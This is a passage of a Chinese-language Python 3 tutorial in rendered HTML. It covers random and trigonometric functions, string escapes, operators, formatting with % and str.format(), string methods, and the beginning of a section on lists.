class="header-anchor">#</a></h4><p>随机数可以用于数学，游戏，安全等领域中，还经常被嵌入到算法中，用以提高算法效率，并提高程序的安全性。</p><p>Python包含以下常用随机数函数：</p><table><thead><tr><th align="left">函数</th><th align="left">描述</th></tr></thead><tbody><tr><td align="left"><a href="https://www.runoob.com/python3/python3-func-number-choice.html" target="_blank" rel="noopener">choice(seq)</a></td><td align="left">从序列的元素中随机挑选一个元素，比如random.choice(range(10))，从0到9中随机挑选一个整数。</td></tr><tr><td align="left"><a href="https://www.runoob.com/python3/python3-func-number-randrange.html" target="_blank" rel="noopener">randrange ([start,] stop [,step])</a></td><td align="left">从指定范围内，按指定基数递增的集合中获取一个随机数，基数默认值为 1</td></tr><tr><td align="left"><a href="https://www.runoob.com/python3/python3-func-number-random.html" target="_blank" rel="noopener">random()</a></td><td align="left">随机生成下一个实数，它在[0,1)范围内。</td></tr><tr><td align="left"><a href="https://www.runoob.com/python3/python3-func-number-seed.html" target="_blank" rel="noopener">seed([x])</a></td><td align="left">改变随机数生成器的种子seed。如果你不了解其原理，你不必特别去设定seed，Python会帮你选择seed。</td></tr><tr><td align="left"><a href="https://www.runoob.com/python3/python3-func-number-shuffle.html" target="_blank" rel="noopener">shuffle(lst)</a></td><td align="left">将序列的所有元素随机排序</td></tr><tr><td align="left"><a href="https://www.runoob.com/python3/python3-func-number-uniform.html" target="_blank" rel="noopener">uniform(x, y)</a></td><td align="left">随机生成下一个实数，它在[x,y]范围内。</td></tr></tbody></table><h4><span id="san-jiao-han-shu">三角函数</span><a href="#san-jiao-han-shu" class="header-anchor">#</a></h4><p>Python包括以下三角函数：</p><table><thead><tr><th align="left">函数</th><th align="left">描述</th></tr></thead><tbody><tr><td align="left"><a href="https://www.runoob.com/python3/python3-func-number-acos.html" target="_blank" rel="noopener">acos(x)</a></td><td align="left">返回x的反余弦弧度值。</td></tr><tr><td align="left"><a href="https://www.runoob.com/python3/python3-func-number-asin.html" target="_blank" rel="noopener">asin(x)</a></td><td align="left">返回x的反正弦弧度值。</td></tr><tr><td align="left"><a href="https://www.runoob.com/python3/python3-func-number-atan.html" target="_blank" rel="noopener">atan(x)</a></td><td align="left">返回x的反正切弧度值。</td></tr><tr><td align="left"><a href="https://www.runoob.com/python3/python3-func-number-atan2.html" target="_blank" rel="noopener">atan2(y, x)</a></td><td align="left">返回给定的 X 及 Y 坐标值的反正切值。</td></tr><tr><td align="left"><a href="https://www.runoob.com/python3/python3-func-number-cos.html" target="_blank" rel="noopener">cos(x)</a></td><td align="left">返回x的弧度的余弦值。</td></tr><tr><td align="left"><a href="https://www.runoob.com/python3/python3-func-number-hypot.html" target="_blank" rel="noopener">hypot(x, y)</a></td><td align="left">返回欧几里德范数 sqrt(x<em>x + y</em>y)。</td></tr><tr><td align="left"><a href="https://www.runoob.com/python3/python3-func-number-sin.html" target="_blank" rel="noopener">sin(x)</a></td><td align="left">返回的x弧度的正弦值。</td></tr><tr><td align="left"><a href="https://www.runoob.com/python3/python3-func-number-tan.html" target="_blank" rel="noopener">tan(x)</a></td><td align="left">返回x弧度的正切值。</td></tr><tr><td align="left"><a href="https://www.runoob.com/python3/python3-func-number-degrees.html" target="_blank" rel="noopener">degrees(x)</a></td><td align="left">将弧度转换为角度,如degrees(math.pi/2) ， 返回90.0</td></tr><tr><td align="left"><a href="https://www.runoob.com/python3/python3-func-number-radians.html" target="_blank" rel="noopener">radians(x)</a></td><td align="left">将角度转换为弧度</td></tr></tbody></table><h4><span id="shu-xue-chang-liang">数学常量</span><a href="#shu-xue-chang-liang" class="header-anchor">#</a></h4><table><thead><tr><th align="left">常量</th><th align="left">描述</th></tr></thead><tbody><tr><td align="left">pi</td><td align="left">数学常量 pi（圆周率，一般以π来表示）</td></tr><tr><td align="left">e</td><td align="left">数学常量 e，e即自然常数（自然常数）。</td></tr></tbody></table><h2><span id="python3-zi-fu-chuan">Python3 字符串</span><a href="#python3-zi-fu-chuan" class="header-anchor">#</a></h2><p>字符串是 Python 中最常用的数据类型。我们可以使用引号( <strong>‘</strong> 或 <strong>“</strong> )来创建字符串。</p><p>创建字符串很简单，只要为变量分配一个值即可。例如：</p><p>var1 = ‘Hello World!’ var2 = “Runoob”</p><hr><h4><span id="python-fang-wen-zi-fu-chuan-zhong-de-zhi">Python 访问字符串中的值</span><a href="#python-fang-wen-zi-fu-chuan-zhong-de-zhi" class="header-anchor">#</a></h4><p>Python 不支持单字符类型，单字符在 Python 中也是作为一个字符串使用。</p><p>Python 访问子字符串，可以使用方括号来截取字符串，如下实例：</p><p>实例(Python 3.0+)</p><p>#!/usr/bin/python3  var1 = ‘Hello World!’ var2 = “Runoob”  print (“var1[0]: “, var1[0]) print (“var2[1:5]: “, var2[1:5])</p><p>以上实例执行结果：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">var1[0]:  H</span><br><span class="line">var2[1:5]:  unoo</span><br></pre></td></tr></table></figure><h4><span id="python-zi-fu-chuan-pin-jie">Python 字符串拼接</span><a href="#python-zi-fu-chuan-pin-jie" class="header-anchor">#</a></h4><p>你可以截取字符串的一部分并与其他字段拼接，如下实例：</p><p>实例(Python 3.0+)</p><p>#!/usr/bin/python3  var1 = ‘Hello World!’  print (“已更新字符串 : “, var1[:6] + ‘Runoob!’)</p><p>以上实例执行结果</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">已更新字符串 :  Hello Runoob!</span><br></pre></td></tr></table></figure><h4><span id="python-zhuan-yi-zi-fu">Python转义字符</span><a href="#python-zhuan-yi-zi-fu" class="header-anchor">#</a></h4><p>在需要在字符中使用特殊字符时，python用反斜杠()转义字符。如下表：</p><table><thead><tr><th align="left">转义字符</th><th align="left">描述</th></tr></thead><tbody><tr><td align="left">(在行尾时)</td><td align="left">续行符</td></tr><tr><td align="left">\</td><td align="left">反斜杠符号</td></tr><tr><td align="left">&#39;</td><td align="left">单引号</td></tr><tr><td align="left">&quot;</td><td align="left">双引号</td></tr><tr><td align="left">\a</td><td align="left">响铃</td></tr><tr><td align="left">\b</td><td align="left">退格(Backspace)</td></tr><tr><td align="left">\000</td><td align="left">空</td></tr><tr><td align="left">\n</td><td align="left">换行</td></tr><tr><td align="left">\v</td><td align="left">纵向制表符</td></tr><tr><td align="left">\t</td><td align="left">横向制表符</td></tr><tr><td align="left">\r</td><td align="left">回车</td></tr><tr><td align="left">\f</td><td align="left">换页</td></tr><tr><td align="left">\oyy</td><td align="left">八进制数，<strong>yy</strong> 代表的字符，例如：<strong>\o12</strong> 代表换行，其中 o 是字母，不是数字 0。</td></tr><tr><td align="left">\xyy</td><td align="left">十六进制数，yy代表的字符，例如：\x0a代表换行</td></tr><tr><td align="left">\other</td><td align="left">其它的字符以普通格式输出</td></tr></tbody></table><h4><span id="python-zi-fu-chuan-yun-suan-fu">Python字符串运算符</span><a href="#python-zi-fu-chuan-yun-suan-fu" class="header-anchor">#</a></h4><p>下表实例变量a值为字符串 “Hello”，b变量值为 “Python”：</p><table><thead><tr><th align="left">操作符</th><th align="left">描述</th><th>实例</th></tr></thead><tbody><tr><td align="left">+</td><td align="left">字符串连接</td><td>a + b 输出结果： HelloPython</td></tr><tr><td align="left">*</td><td align="left">重复输出字符串</td><td>a*2 输出结果：HelloHello</td></tr><tr><td align="left">[]</td><td align="left">通过索引获取字符串中字符</td><td>a[1] 输出结果 <strong>e</strong></td></tr><tr><td align="left">[ : ]</td><td align="left">截取字符串中的一部分，遵循<strong>左闭右开</strong>原则，str[0,2] 是不包含第 3 个字符的。</td><td>a[1:4] 输出结果 <strong>ell</strong></td></tr><tr><td align="left">in</td><td align="left">成员运算符 - 如果字符串中包含给定的字符返回 True</td><td><strong>‘H’ in a</strong> 输出结果 True</td></tr><tr><td align="left">not in</td><td align="left">成员运算符 - 如果字符串中不包含给定的字符返回 True</td><td><strong>‘M’ not in a</strong> 输出结果 True</td></tr><tr><td align="left">r/R</td><td align="left">原始字符串 - 原始字符串：所有的字符串都是直接按照字面的意思来使用，没有转义特殊或不能打印的字符。 原始字符串除在字符串的第一个引号前加上字母 <strong>r</strong>（可以大小写）以外，与普通字符串有着几乎完全相同的语法。</td><td><code>print( r&#39;\n&#39; ) print( R&#39;\n&#39; )</code></td></tr><tr><td align="left">%</td><td align="left">格式字符串</td><td>请看下一节内容。</td></tr></tbody></table><h4><span id="python-zi-fu-chuan-ge-shi-hua">Python字符串格式化</span><a href="#python-zi-fu-chuan-ge-shi-hua" class="header-anchor">#</a></h4><p>Python 支持格式化字符串的输出 。尽管这样可能会用到非常复杂的表达式，但最基本的用法是将一个值插入到一个有字符串格式符 %s 的字符串中。</p><p>在 Python 中，字符串格式化使用与 C 中 sprintf 函数一样的语法。</p><p>实例(Python 3.0+)</p><p>#!/usr/bin/python3  print (“我叫 %s 今年 %d 岁!” % (‘小明’, 10))</p><p>以上实例输出结果：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">我叫 小明 今年 10 岁!</span><br></pre></td></tr></table></figure><p>python字符串格式化符号:</p><table><thead><tr><th align="left">符  号</th><th align="left">描述</th></tr></thead><tbody><tr><td align="left">%c</td><td align="left">格式化字符及其ASCII码</td></tr><tr><td align="left">%s</td><td align="left">格式化字符串</td></tr><tr><td align="left">%d</td><td align="left">格式化整数</td></tr><tr><td align="left">%u</td><td align="left">格式化无符号整型</td></tr><tr><td align="left">%o</td><td align="left">格式化无符号八进制数</td></tr><tr><td align="left">%x</td><td align="left">格式化无符号十六进制数</td></tr><tr><td align="left">%X</td><td align="left">格式化无符号十六进制数（大写）</td></tr><tr><td align="left">%f</td><td align="left">格式化浮点数字，可指定小数点后的精度</td></tr><tr><td align="left">%e</td><td align="left">用科学计数法格式化浮点数</td></tr><tr><td align="left">%E</td><td align="left">作用同%e，用科学计数法格式化浮点数</td></tr><tr><td align="left">%g</td><td align="left">%f和%e的简写</td></tr><tr><td align="left">%G</td><td align="left">%f 和 %E 的简写</td></tr><tr><td align="left">%p</td><td align="left">用十六进制数格式化变量的地址</td></tr></tbody></table><p>格式化操作符辅助指令:</p><table><thead><tr><th align="left">符号</th><th align="left">功能</th></tr></thead><tbody><tr><td align="left">*</td><td align="left">定义宽度或者小数点精度</td></tr><tr><td align="left">-</td><td align="left">用做左对齐</td></tr><tr><td align="left">+</td><td align="left">在正数前面显示加号( + )</td></tr><tr><td align="left"><sp></sp></td><td align="left">在正数前面显示空格</td></tr><tr><td align="left">#</td><td align="left">在八进制数前面显示零(‘0’)，在十六进制前面显示’0x’或者’0X’(取决于用的是’x’还是’X’)</td></tr><tr><td align="left">0</td><td align="left">显示的数字前面填充’0’而不是默认的空格</td></tr><tr><td align="left">%</td><td align="left">‘%%’输出一个单一的’%’</td></tr><tr><td align="left">(var)</td><td align="left">映射变量(字典参数)</td></tr><tr><td align="left">m.n.</td><td align="left">m 是显示的最小总宽度,n 是小数点后的位数(如果可用的话)</td></tr></tbody></table><p>Python2.6 开始，新增了一种格式化字符串的函数 <a href="https://www.runoob.com/python/att-string-format.html" target="_blank" rel="noopener">str.format()</a>，它增强了字符串格式化的功能。</p><h4><span id="python-format-ge-shi-hua-han-shu">Python format 格式化函数</span><a href="#python-format-ge-shi-hua-han-shu" class="header-anchor">#</a></h4><p>Python2.6 开始，新增了一种格式化字符串的函数 <strong>str.format()</strong>，它增强了字符串格式化的功能。</p><p>基本语法是通过 <strong>{}</strong> 和 <strong>:</strong> 来代替以前的 <strong>%</strong> 。</p><p>format 函数可以接受不限个参数，位置可以不按顺序。</p><p>实例</p><p>&gt;&gt;&gt;”{} {}”.format(“hello”, “world”)    # 不设置指定位置，按默认顺序 ‘hello world’  &gt;&gt;&gt; “{0} {1}”.format(“hello”, “world”)  # 设置指定位置 ‘hello world’  &gt;&gt;&gt; “{1} {0} {1}”.format(“hello”, “world”)  # 设置指定位置 ‘world hello world’</p><p>也可以设置参数：</p><p>实例</p><p>#!/usr/bin/python # -<em>- coding: UTF-8 -</em>-  print(“网站名：{name}, 地址 {url}”.format(name=”菜鸟教程”, url=”<a href="http://www.runoob.com&quot;" target="_blank" rel="noopener">www.runoob.com&quot;</a>))  # 通过字典设置参数 site = {“name”: “菜鸟教程”, “url”: “<a href="http://www.runoob.com&quot;}" target="_blank" rel="noopener">www.runoob.com&quot;}</a> print(“网站名：{name}, 地址 {url}”.format(**site))  # 通过列表索引设置参数 my_list = [‘菜鸟教程’, ‘<a href="http://www.runoob.com&#39;]" target="_blank" rel="noopener">www.runoob.com&#39;]</a> print(“网站名：{0[0]}, 地址 {0[1]}”.format(my_list))  # “0” 是必须的</p><p>输出结果为：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">网站名：菜鸟教程, 地址 www.runoob.com</span><br><span class="line">网站名：菜鸟教程, 地址 www.runoob.com</span><br><span class="line">网站名：菜鸟教程, 地址 www.runoob.com</span><br></pre></td></tr></table></figure><p>也可以向 <strong>str.format()</strong> 传入对象：</p><p>实例</p><p>#!/usr/bin/python # -<em>- coding: UTF-8 -</em>-  class AssignValue(object):    def <strong>init</strong>(self, value):        self.value = value my_value = AssignValue(6) print(‘value 为: {0.value}’.format(my_value))  # “0” 是可选的</p><p>输出结果为：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">value 为: 6</span><br></pre></td></tr></table></figure><h6><span id="shu-zi-ge-shi-hua">数字格式化</span><a href="#shu-zi-ge-shi-hua" class="header-anchor">#</a></h6><p>下表展示了 str.format() 格式化数字的多种方法：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">&gt;&gt;&gt; print(&quot;&#123;:.2f&#125;&quot;.format(3.1415926));</span><br><span class="line">3.14</span><br></pre></td></tr></table></figure><table><thead><tr><th align="left">数字</th><th align="left">格式</th><th align="left">输出</th><th align="left">描述</th></tr></thead><tbody><tr><td align="left">3.1415926</td><td align="left">{:.2f}</td><td align="left">3.14</td><td align="left">保留小数点后两位</td></tr><tr><td align="left">3.1415926</td><td align="left">{:+.2f}</td><td align="left">+3.14</td><td align="left">带符号保留小数点后两位</td></tr><tr><td align="left">-1</td><td align="left">{:+.2f}</td><td align="left">-1.00</td><td align="left">带符号保留小数点后两位</td></tr><tr><td align="left">2.71828</td><td align="left">{:.0f}</td><td align="left">3</td><td align="left">不带小数</td></tr><tr><td align="left">5</td><td align="left">{:0&gt;2d}</td><td align="left">05</td><td align="left">数字补零 (填充左边, 宽度为2)</td></tr><tr><td align="left">5</td><td align="left">{:x&lt;4d}</td><td align="left">5xxx</td><td align="left">数字补x (填充右边, 宽度为4)</td></tr><tr><td align="left">10</td><td align="left">{:x&lt;4d}</td><td align="left">10xx</td><td align="left">数字补x (填充右边, 宽度为4)</td></tr><tr><td align="left">1000000</td><td align="left">{:,}</td><td align="left">1,000,000</td><td align="left">以逗号分隔的数字格式</td></tr><tr><td align="left">0.25</td><td align="left">{:.2%}</td><td align="left">25.00%</td><td align="left">百分比格式</td></tr><tr><td align="left">1000000000</td><td align="left">{:.2e}</td><td align="left">1.00e+09</td><td align="left">指数记法</td></tr><tr><td align="left">13</td><td align="left">{:&gt;10d}</td><td align="left">13</td><td align="left">右对齐 (默认, 宽度为10)</td></tr><tr><td align="left">13</td><td align="left">{:&lt;10d}</td><td align="left">13</td><td align="left">左对齐 (宽度为10)</td></tr><tr><td align="left">13</td><td align="left">{:^10d}</td><td align="left">13</td><td align="left">中间对齐 (宽度为10)</td></tr><tr><td align="left">11</td><td align="left"><code>&#39;{:b}&#39;.format(11) &#39;{:d}&#39;.format(11) &#39;{:o}&#39;.format(11) &#39;{:x}&#39;.format(11) &#39;{:#x}&#39;.format(11) &#39;{:#X}&#39;.format(11)</code></td><td align="left"><code>1011 11 13 b 0xb 0XB</code></td><td align="left">进制</td></tr></tbody></table><p><strong>^</strong>, <strong>&lt;</strong>, <strong>&gt;</strong> 分别是居中、左对齐、右对齐，后面带宽度， <strong>:</strong> 号后面带填充的字符，只能是一个字符，不指定则默认是用空格填充。</p><p><strong>+</strong> 表示在正数前显示 <strong>+</strong>，负数前显示 <strong>-</strong>； （空格）表示在正数前加空格</p><p>b、d、o、x 分别是二进制、十进制、八进制、十六进制。</p><p>此外我们可以使用大括号 <strong>{}</strong> 来转义大括号，如下实例：</p><p>实例</p><p>#!/usr/bin/python # -<em>- coding: UTF-8 -</em>-  print (“{} 对应的位置是 0“.format(“runoob”))</p><p>输出结果为：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">runoob 对应的位置是 &#123;0&#125;</span><br></pre></td></tr></table></figure><h4><span id="python-de-zi-fu-chuan-nei-jian-han-shu">Python 的字符串内建函数</span><a href="#python-de-zi-fu-chuan-nei-jian-han-shu" class="header-anchor">#</a></h4><p>Python 的字符串常用内建函数如下：</p><table><thead><tr><th align="left">序号</th><th align="left">方法及描述</th></tr></thead><tbody><tr><td align="left">1</td><td align="left"><a href="https://www.runoob.com/python3/python3-string-capitalize.html" target="_blank" rel="noopener">capitalize()</a> 将字符串的第一个字符转换为大写</td></tr><tr><td align="left">2</td><td align="left"><a href="https://www.runoob.com/python3/python3-string-center.html" target="_blank" rel="noopener">center(width, fillchar)</a> 返回一个指定的宽度 width 居中的字符串，fillchar 为填充的字符，默认为空格。</td></tr><tr><td align="left">3</td><td align="left"><a href="https://www.runoob.com/python3/python3-string-count.html" target="_blank" rel="noopener">count(str, beg= 0,end=len(string))</a> 返回 str 在 string 里面出现的次数，如果 beg 或者 end 指定则返回指定范围内 str 出现的次数</td></tr><tr><td align="left">4</td><td align="left"><a href="https://www.runoob.com/python3/python3-string-decode.html" target="_blank" rel="noopener">bytes.decode(encoding=”utf-8”, errors=”strict”)</a> Python3 中没有 decode 方法，但我们可以使用 bytes 对象的 decode() 方法来解码给定的 bytes 对象，这个 bytes 对象可以由 str.encode() 来编码返回。</td></tr><tr><td align="left">5</td><td align="left"><a href="https://www.runoob.com/python3/python3-string-encode.html" target="_blank" rel="noopener">encode(encoding=’UTF-8’,errors=’strict’)</a> 以 encoding 指定的编码格式编码字符串，如果出错默认报一个ValueError 的异常，除非 errors 指定的是’ignore’或者’replace’</td></tr><tr><td align="left">6</td><td align="left"><a href="https://www.runoob.com/python3/python3-string-endswith.html" target="_blank" rel="noopener">endswith(suffix, beg=0, end=len(string))</a> 检查字符串是否以 obj 结束，如果beg 或者 end 指定则检查指定的范围内是否以 obj 结束，如果是，返回 True,否则返回 False.</td></tr><tr><td align="left">7</td><td align="left"><a href="https://www.runoob.com/python3/python3-string-expandtabs.html" target="_blank" rel="noopener">expandtabs(tabsize=8)</a> 把字符串 string 中的 tab 符号转为空格，tab 符号默认的空格数是 8 。</td></tr><tr><td align="left">8</td><td align="left"><a href="https://www.runoob.com/python3/python3-string-find.html" target="_blank" rel="noopener">find(str, beg=0, end=len(string))</a> 检测 str 是否包含在字符串中，如果指定范围 beg 和 end ，则检查是否包含在指定范围内，如果包含返回开始的索引值，否则返回-1</td></tr><tr><td align="left">9</td><td align="left"><a href="https://www.runoob.com/python3/python3-string-index.html" target="_blank" rel="noopener">index(str, beg=0, end=len(string))</a> 跟find()方法一样，只不过如果str不在字符串中会报一个异常.</td></tr><tr><td align="left">10</td><td align="left"><a href="https://www.runoob.com/python3/python3-string-isalnum.html" target="_blank" rel="noopener">isalnum()</a> 如果字符串至少有一个字符并且所有字符都是字母或数字则返 回 True,否则返回 False</td></tr><tr><td align="left">11</td><td align="left"><a href="https://www.runoob.com/python3/python3-string-isalpha.html" target="_blank" rel="noopener">isalpha()</a> 如果字符串至少有一个字符并且所有字符都是字母则返回 True, 否则返回 False</td></tr><tr><td align="left">12</td><td align="left"><a href="https://www.runoob.com/python3/python3-string-isdigit.html" target="_blank" rel="noopener">isdigit()</a> 如果字符串只包含数字则返回 True 否则返回 False..</td></tr><tr><td align="left">13</td><td align="left"><a href="https://www.runoob.com/python3/python3-string-islower.html" target="_blank" rel="noopener">islower()</a> 如果字符串中包含至少一个区分大小写的字符，并且所有这些(区分大小写的)字符都是小写，则返回 True，否则返回 False</td></tr><tr><td align="left">14</td><td align="left"><a href="https://www.runoob.com/python3/python3-string-isnumeric.html" target="_blank" rel="noopener">isnumeric()</a> 如果字符串中只包含数字字符，则返回 True，否则返回 False</td></tr><tr><td align="left">15</td><td align="left"><a href="https://www.runoob.com/python3/python3-string-isspace.html" target="_blank" rel="noopener">isspace()</a> 如果字符串中只包含空白，则返回 True，否则返回 False.</td></tr><tr><td align="left">16</td><td align="left"><a href="https://www.runoob.com/python3/python3-string-istitle.html" target="_blank" rel="noopener">istitle()</a> 如果字符串是标题化的(见 title())则返回 True，否则返回 False</td></tr><tr><td align="left">17</td><td align="left"><a href="https://www.runoob.com/python3/python3-string-isupper.html" target="_blank" rel="noopener">isupper()</a> 如果字符串中包含至少一个区分大小写的字符，并且所有这些(区分大小写的)字符都是大写，则返回 True，否则返回 False</td></tr><tr><td align="left">18</td><td align="left"><a href="https://www.runoob.com/python3/python3-string-join.html" target="_blank" rel="noopener">join(seq)</a> 以指定字符串作为分隔符，将 seq 中所有的元素(的字符串表示)合并为一个新的字符串</td></tr><tr><td align="left">19</td><td align="left"><a href="https://www.runoob.com/python3/python3-string-len.html" target="_blank" rel="noopener">len(string)</a> 返回字符串长度</td></tr><tr><td align="left">20</td><td align="left"><a href="https://www.runoob.com/python3/python3-string-ljust.html" target="_blank" rel="noopener">ljust(width[, fillchar])</a> 返回一个原字符串左对齐,并使用 fillchar 填充至长度 width 的新字符串，fillchar 默认为空格。</td></tr><tr><td align="left">21</td><td align="left"><a href="https://www.runoob.com/python3/python3-string-lower.html" target="_blank" rel="noopener">lower()</a> 转换字符串中所有大写字符为小写.</td></tr><tr><td align="left">22</td><td align="left"><a href="https://www.runoob.com/python3/python3-string-lstrip.html" target="_blank" rel="noopener">lstrip()</a> 截掉字符串左边的空格或指定字符。</td></tr><tr><td align="left">23</td><td align="left"><a href="https://www.runoob.com/python3/python3-string-maketrans.html" target="_blank" rel="noopener">maketrans()</a> 创建字符映射的转换表，对于接受两个参数的最简单的调用方式，第一个参数是字符串，表示需要转换的字符，第二个参数也是字符串表示转换的目标。</td></tr><tr><td align="left">24</td><td align="left"><a href="https://www.runoob.com/python3/python3-string-max.html" target="_blank" rel="noopener">max(str)</a> 返回字符串 str 中最大的字母。</td></tr><tr><td align="left">25</td><td align="left"><a href="https://www.runoob.com/python3/python3-string-min.html" target="_blank" rel="noopener">min(str)</a> 返回字符串 str 中最小的字母。</td></tr><tr><td align="left">26</td><td align="left"><a href="https://www.runoob.com/python3/python3-string-replace.html" target="_blank" rel="noopener">replace(old, new [, max])</a> 把 将字符串中的 str1 替换成 str2,如果 max 指定，则替换不超过 max 次。</td></tr><tr><td align="left">27</td><td align="left"><a href="https://www.runoob.com/python3/python3-string-rfind.html" target="_blank" rel="noopener">rfind(str, beg=0,end=len(string))</a> 类似于 find()函数，不过是从右边开始查找.</td></tr><tr><td align="left">28</td><td align="left"><a href="https://www.runoob.com/python3/python3-string-rindex.html" target="_blank" rel="noopener">rindex( str, beg=0, end=len(string))</a> 类似于 index()，不过是从右边开始.</td></tr><tr><td align="left">29</td><td align="left"><a href="https://www.runoob.com/python3/python3-string-rjust.html" target="_blank" rel="noopener">rjust(width,[, fillchar])</a> 返回一个原字符串右对齐,并使用fillchar(默认空格）填充至长度 width 的新字符串</td></tr><tr><td align="left">30</td><td align="left"><a href="https://www.runoob.com/python3/python3-string-rstrip.html" target="_blank" rel="noopener">rstrip()</a> 删除字符串字符串末尾的空格.</td></tr><tr><td align="left">31</td><td align="left"><a href="https://www.runoob.com/python3/python3-string-split.html" target="_blank" rel="noopener">split(str=””, num=string.count(str))</a> num=string.count(str)) 以 str 为分隔符截取字符串，如果 num 有指定值，则仅截取 num+1 个子字符串</td></tr><tr><td align="left">32</td><td align="left"><a href="https://www.runoob.com/python3/python3-string-splitlines.html" target="_blank" rel="noopener">splitlines([keepends])</a> 按照行(‘\r’, ‘\r\n’, \n’)分隔，返回一个包含各行作为元素的列表，如果参数 keepends 为 False，不包含换行符，如果为 True，则保留换行符。</td></tr><tr><td align="left">33</td><td align="left"><a href="https://www.runoob.com/python3/python3-string-startswith.html" target="_blank" rel="noopener">startswith(substr, beg=0,end=len(string))</a> 检查字符串是否是以指定子字符串 substr 开头，是则返回 True，否则返回 False。如果beg 和 end 指定值，则在指定范围内检查。</td></tr><tr><td align="left">34</td><td align="left"><a href="https://www.runoob.com/python3/python3-string-strip.html" target="_blank" rel="noopener">strip([chars])</a> 在字符串上执行 lstrip()和 rstrip()</td></tr><tr><td align="left">35</td><td align="left"><a href="https://www.runoob.com/python3/python3-string-swapcase.html" target="_blank" rel="noopener">swapcase()</a> 将字符串中大写转换为小写，小写转换为大写</td></tr><tr><td align="left">36</td><td align="left"><a href="https://www.runoob.com/python3/python3-string-title.html" target="_blank" rel="noopener">title()</a> 返回”标题化”的字符串,就是说所有单词都是以大写开始，其余字母均为小写(见 istitle())</td></tr><tr><td align="left">37</td><td align="left"><a href="https://www.runoob.com/python3/python3-string-translate.html" target="_blank" rel="noopener">translate(table, deletechars=””)</a> 根据 str 给出的表(包含 256 个字符)转换 string 的字符, 要过滤掉的字符放到 deletechars 参数中</td></tr><tr><td align="left">38</td><td align="left"><a href="https://www.runoob.com/python3/python3-string-upper.html" target="_blank" rel="noopener">upper()</a> 转换字符串中的小写字母为大写</td></tr><tr><td align="left">39</td><td align="left"><a href="https://www.runoob.com/python3/python3-string-zfill.html" target="_blank" rel="noopener">zfill (width)</a> 返回长度为 width 的字符串，原字符串右对齐，前面填充0</td></tr><tr><td align="left">40</td><td align="left"><a href="https://www.runoob.com/python3/python3-string-isdecimal.html" target="_blank" rel="noopener">isdecimal()</a> 检查字符串是否只包含十进制字符，如果是返回 true，否则返回 false。</td></tr></tbody></table><h2><span id="python3-lie-biao">Python3 列表</span><a href="#python3-lie-biao" class="header-anchor">#</a></h2><p>序列是Python中最基本的数据结构。序列中的每个元素都分配一个数字 - 它的位置，或索引，第一个索引是0，第二个索引是1，依此类推。</p><p>Python有6个序列的内置类型，但最常见的是列表和元组。</p><p>序列都可以进行的操作包括索引，切片，加，乘，检查成员。</p><p>此外，Python已经内置确定序列的长度以及确定最大和最小的元素的方法。</p><p>列表是最常用的Python数据类型，它可以作为一个方括号内的逗号分隔值出现。</p><p>列表的数据项不需要具有相同的类型</p><p>创建一个列表，只要把逗号分隔的不同的数据项使用方括号括起来即可。如下所示：</p><p>list1 = [‘Google’, ‘Runoob’, 1997, 2000]; list2 = [1, 2, 3, 4, 5 ]; list3 = [“a”, “b”, “c”, “d”];</p><p>与字符串的索引一样，列表索引从0开始。列表可以进行截取、组合等。</p><hr><h4><span id="fang-wen-lie-biao-zhong-de-zhi">访问列表中的值</span><a href="#fang-wen-lie-biao-zhong-de-zhi" class="header-anchor">#</a></h4><p>使用下标索引来访问列表中的值，同样你也可以使用方括号的形式截取字符，如下所示：</p><p>实例(Python 3.0+)</p><p>#!/usr/bin/python3  list1 = [‘Google’, ‘Runoob’, 1997, 2000]; list2 = [1, 2, 3, 4, 5, 6, 7 ];  print (“list1[0]: “, list1[0]) print (“list2[1:5]: “, list2[1:5])</p><p>以上实例输出结果：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">list1[0]:  Google</span><br><span class="line">list2[1:5]:  [2, 3, 4, 5]</span><br></pre></td></tr></table></figure><hr><h4><span id="geng-xin-lie-biao">更新列表</span><a href="#geng-xin-lie-biao" class="header-anchor">#</a></h4><p>你可以对列表的数据项进行修改或更新，你也可以使用append()方法来添加列表项，如下所示：</p><p>实例(Python 3.0+)</p><p>#!/usr/bin/python3  list = [‘Google’, ‘Runoob’, 1997, 2000]  print (“第三个元素为 : “, list[2]) list[2] = 2001 print (“更新后的第三个元素为 : “, list[2])</p><p><strong>注意：</strong>我们会在接下来的章节讨论append()方法的使用</p><p>以上实例输出结果：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">第三个元素为 :  1997</span><br><span class="line">更新后的第三个元素为 :  2001</span><br></pre></td></tr></table></figure><hr><h4><span id="shan-chu-lie-biao-yuan-su">删除列表元素</span><a href="#shan-chu-lie-biao-yuan-su" class="header-anchor">#</a></h4><p>可以使用 del 语句来删除列表的的元素，如下实例：</p><p>#!/usr/bin/python3  list = [‘Google’, ‘Runoob’, 1997, 2000]  print (“原始列表 : “, list) del list[2] print (“删除第三个元素 : “, list)</p><p>以上实例输出结果：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">原始列表 :  [&apos;Google&apos;, &apos;Runoob&apos;, 1997, 2000]</span><br><span class="line">删除第三个元素 :  [&apos;Google&apos;, &apos;Runoob&apos;, 2000]</span><br></pre></td></tr></table></figure><p><strong>注意：</strong>我们会在接下来的章节讨论 remove() 方法的使用</p><hr><h4><span id="python-lie-biao-jiao-ben-cao-zuo-fu">Python列表脚本操作符</span><a href="#python-lie-biao-jiao-ben-cao-zuo-fu" class="header-anchor">#</a></h4><p>列表对 + 和 * 的操作符与字符串相似。+ 号用于组合列表，* 号用于重复列表。</p><p>如下所示：</p><table><thead><tr><th 